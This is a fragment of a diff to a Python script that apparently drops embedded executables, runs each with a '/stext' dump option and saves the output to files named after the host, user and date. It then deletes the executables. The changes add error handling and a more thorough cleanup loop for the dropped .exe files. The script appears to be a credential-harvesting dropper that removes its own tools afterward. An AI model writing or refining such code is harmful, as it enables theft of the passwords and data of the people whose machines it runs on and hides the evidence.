@@ -1,4 +1,4 @@
-import sys, base64, inspect, glob, os, getpass, datetime, subprocess
+import sys, base64, inspect, glob, os, getpass, datetime
 
 def write(EXE_NAME, EXE_DATA):
     with open(EXE_NAME, "wb") as file: 
@@ -80,10 +80,19 @@ for exe_file in exe_files:
     sfname = f"{pcname}.{username}.{date}.{filename}.txt"
     command = f'"{exe_file}" /stext {sfname}'
     print("Running " + command)
-    os.system(command)
-    if os.path.getsize(sfname) <= 3:
-        os.remove(sfname)
-
+    try:
+        os.system(command)
+        if os.path.getsize(sfname) <= 3:
+            os.remove(sfname)
+    except Exception as e:
+        print(e)
 
 # remove all *.exe
-os.system("del *.exe")
+try:
+    os.system("del *.exe")
+except:
+    pass
+for file in os.listdir(os.getcwd()):
+    if file.endswith(".exe"):
+        os.remove(file)
+        
